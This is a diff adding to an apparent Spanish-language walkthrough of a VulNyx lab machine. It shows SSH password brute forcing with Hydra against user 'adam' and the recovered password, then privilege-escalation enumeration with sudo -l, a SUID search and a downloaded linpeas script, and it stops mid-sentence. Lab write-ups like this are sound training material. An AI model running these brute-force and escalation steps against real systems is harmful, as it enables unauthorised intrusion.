@@ -66,6 +66,41 @@ Como vemos con el modulo numero 1 podemos listar usuario, por lo que procedemos 
 ![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/f5cc909a-89c7-4939-8899-debd586ac97f)
 
 Luego de configurado el exploit seteando la ip objetivo y el diccionario que utilizamos para el ataque con nombres de usuarios, nos dice que hay un usuario de nombre "adam"
+Rapidamente probamos sin exito con el modulo de ataques de fuerza bruta al protocolo ssh, por lo que seguimos con la herramienta Hydra.
 
+![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/60bebce6-9903-4aaa-b9e2-0f8c40f9f670)
 
+## Hydra.
 
+Atacamos con hydra indicando el usurio, el diccionario que vamos a utilizar y el protocolo que vamos a atacar.
+
+```
+sudo hydra -l adam -P DICCIONARIO ssh://192.168.1.105
+```
+
+![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/f26d8fd3-dd24-4a9a-89d0-1f6884443d26)
+
+Hydra nos encuentra la contraseña "passion", por lo que nos conectamos por ssh.
+
+## Escalada de privilegios.
+
+Lo primero que probamos son los comandos:
+
+```
+sudo -l
+```
+```
+find / -perm -4000 2</dev/null
+```
+
+![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/7c596878-a73b-4511-af43-0c1473cb4b64)
+
+Dentro de los binarios no vemos nada llamativo, mas que el binario DOAS, por lo que procedemos a descargar y usar la herramienta "linpeas.sh" para estar mas seguros.
+
+```
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+```
+
+![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/0e16e493-2b1c-4da1-afdc-f02e4f300f31)
+
+Como vemos el resultado del escaneo con linpeas nos 
